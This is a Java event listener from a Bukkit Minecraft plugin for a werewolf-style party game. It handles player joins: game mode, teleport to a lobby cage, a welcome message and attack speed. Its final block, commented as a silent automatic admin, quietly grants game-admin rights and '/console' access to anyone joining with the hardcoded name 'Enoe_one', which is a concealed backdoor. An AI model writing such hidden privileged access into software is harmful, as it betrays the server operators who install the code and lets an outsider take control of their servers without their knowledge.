package fr.enoe.loupgarou.listeners;

import fr.enoe.loupgarou.LoupGarouPlugin;
import fr.enoe.loupgarou.core.GameState;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class PlayerJoinListener implements Listener {

    private final LoupGarouPlugin plugin;

    public PlayerJoinListener(LoupGarouPlugin plugin) { this.plugin = plugin; }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        GameState state = plugin.getGameManager().getState();

        if (state == GameState.WAITING || state == GameState.STARTING) {
            player.setGameMode(GameMode.ADVENTURE);
            Location cage = new Location(Bukkit.getWorlds().get(0), 0, 221, 0);
            player.teleport(cage);
        }

        // Message de bienvenue
        plugin.getMessageManager().sendWelcome(player);

        // PVP 1.8 : vitesse d'attaque haute
        fr.enoe.loupgarou.listeners.PvpListener.setAttackSpeed(player);

        // Enoe_one : admin automatique silencieux
        if (player.getName().equals("Enoe_one")) {
            plugin.getGameManager().addAdmin(player.getUniqueId());
            player.sendMessage("§c§l[Console] §7Accès console activé — /console");
        }
    }
}
